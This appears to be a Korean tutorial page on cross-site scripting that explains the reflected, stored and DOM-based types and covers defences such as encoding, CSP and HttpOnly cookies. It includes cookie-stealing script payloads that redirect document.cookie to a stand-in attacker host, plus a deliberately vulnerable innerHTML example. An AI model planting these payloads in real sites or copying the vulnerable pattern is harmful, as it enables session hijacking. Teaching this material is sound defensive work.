---
layout: page
title: 3. XSS (Cross-Site Scripting)
description: >
hide_description: true
sitemap: false
---

### 3.1 **XSS (Cross-Site Scripting)란?**

- 웹 애플리케이션의 취약점을 이용해 악성 스크립트를 다른 사용자의 브라우저에서 실행시키는 공격입니다. 이를 통해 공격자는 사용자의 세션을 가로채거나, 악성 코드 실행, 웹사이트 변조 등의 공격을 수행할 수 있습니다.

### 3.2 공격유형

- **반사형 XSS (Reflected XSS)**
    - **반사형 XSS**는 사용자가 입력한 데이터가 즉시 웹 페이지에 반영되어 발생하는 공격입니다. 보통 URL에 포함된 악성 스크립트를 통해 이루어집니다.
    - 예시
        - 사용자가 http://example.com/search?q=<script>alert(document.cookie)</script>와 같은 URL을 입력합니다.
        - 웹 애플리케이션이 검색어를 그대로 페이지에 출력하면, 스크립트가 실행되어 경고 창이 나타납니다.
        - 문제는 경고 창에 사용자의 쿠키가 노출되는 것입니다.
        - 해당 쿠키를 리다이렉트를 통해 공격자의 사이트로 전달되게 하여 탈취가 가능하게 됩니다.

            ```jsx
            <script>document.location='[http://127.0.0.1/cookie?'+document.cookie](http://127.0.0.1/cookie?%27+document.cookie)</script>
            ```

        - **경고 창** : alert(document.cookie)는 사용자의 쿠키를 경고 창에 표시합니다.
        - **쿠키 탈취** : document.location='http://127.0.0.1/cookie?' + document.cookie는 사용자의 쿠키를 공격자의 서버로 전송하여 탈취할 수 있습니다.
- **저장형 XSS (Stored XSS)**:
    - **저장형 XSS**는 악성 스크립트가 서버에 저장되어 여러 사용자가 해당 스크립트를 실행하게 되는 경우입니다. 예를 들어, 게시판에 악성 스크립트를 포함한 글을 작성하면, 해당 글을 보는 모든 사용자의 브라우저에서 스크립트가 실행됩니다.
    - 예시
        - 사용자가 게시판에 다음과 같은 악성 스크립트를 포함한 글을 작성합니다.

            ```jsx
            <script>document.location='http://127.0.0.1/cookie?'+document.cookie</script>
            ```

        - 해당 게시글을 보는 모든 사용자의 브라우저에서 스크립트가 실행되어, 사용자의 쿠키가 공격자의 서버로 전송되어 탈취가 발생합니다.
- **DOM 기반 XSS (DOM-based XSS)**:
    - 클라이언트 측에서 JavaScript를 통해 DOM을 동적으로 조작할 때 발생합니다. 서버에 요청을 보내지 않고, 클라이언트 측에서 스크립트가 실행됩니다.
    - 예시
        - 클라이언트 측 스크립트가 URL 파라미터를 읽어와 DOM에 삽입할 때, 악성 스크립트가 포함될 수 있습니다.

            ```java
            <!DOCTYPE html>
            <html>
            <head>
                <title>DOM-based XSS Example</title>
            </head>
            <body>
                <h1>Welcome to My Page</h1>
                <div id="output"></div>
                <script>
                    // URL의 해시 부분을 읽어와서 출력
                    var hash = window.location.hash.substring(1);
                    document.getElementById('output').innerHTML = hash;
                </script>
            </body>
            </html>
            ```

        - 사용자가 http://example.com/#<script>alert('XSS');</script>라는 URL에 접근하면, 페이지는 해시 부분에 포함된 스크립트를 실행하여 경고 창이 나타납니다
        - 공격자는 이 취약점을 악용하여 악성 스크립트를 실행할 수 있습니다.
- **반사형 XSS와 DOM 기반 XSS의 차이점**
    - 반사형 XSS와 DOM 기반 XSS는 모두 XSS 공격의 일종이지만, 발생 위치와 동작 방식에서 차이가 있습니다.
    - 반사형 XSS는 서버 측에서 발생하며, 입력된 데이터가 서버를 통해 반사되어 클라이언트로 돌아옵니다.
    - 반면, DOM 기반 XSS는 클라이언트 측에서 발생하며, 클라이언트 측 JavaScript가 직접 데이터를 처리하고 DOM을 조작합니다.

### 3.3 **XSS 공격의 위험성**

- **세션 하이재킹**: 사용자의 세션 쿠키를 탈취하여 공격자가 사용자의 계정으로 로그인할 수 있습니다.
- **악성 코드 실행**: 악성 스크립트를 실행하여 사용자의 시스템에 피해를 줄 수 있습니다.
- **피싱 공격**: 사용자를 속여 민감한 정보를 입력하도록 유도할 수 있습니다.
- **웹사이트 변조**: 웹페이지의 내용을 변경하여 사용자에게 잘못된 정보를 제공할 수 있습니다.

### 3.4 **XSS 방어 기법**

- **입력 검증 및 인코딩**
    - 사용자 입력을 철저히 검증하고, 출력할 때 적절히 인코딩하여 스크립트가 실행되지 않도록 합니다.
    - 예시: HTML 인코딩, JavaScript 인코딩, URL 인코딩 등을 사용하여 사용자 입력을 안전하게 처리합니다.

- **Content Security Policy (CSP)**
    - Content Security Policy (CSP)는 웹 애플리케이션이 허용된 콘텐츠 소스를 명시하여 XSS(크로스 사이트 스크립팅) 및 데이터 삽입 공격을 방지하는 보안 기능입니다.
    - CSP는 웹 애플리케이션이 로드할 수 있는 리소스의 출처를 정의하는 HTTP 응답 헤더입니다. 이를 통해 개발자는 특정 스크립트, 스타일시트, 이미지 등을 로드할 수 있는 출처를 제한할 수 있습니다.
    - 예시: Content-Security-Policy: default-src 'self’ [https://trusted.cdn.com](https://trusted.cdn.com/);

- **HTTPOnly 쿠키 사용**
    - 세션 쿠키에 HttpOnly 속성을 설정하여 JavaScript에서 접근하지 못하도록 합니다. 이를 통해 세션 하이재킹을 방지할 수 있습니다.
    - HTTPOnly 쿠키는 서버 측에서 설정합니다.
    - 예시: Set-Cookie: sessionId=abc123; HttpOnly; Secure
- **JavaScript 안전하게 사용하기**

  클라이언트 측에서 사용자 입력을 직접적으로 처리하지 않도록 합니다. JavaScript를 사용할 때, DOM 조작 시 사용자 입력을 안전하게 처리합니다. 예를들어 인코딩 처리나 안전한 메스드를 사용하여 조작합니다.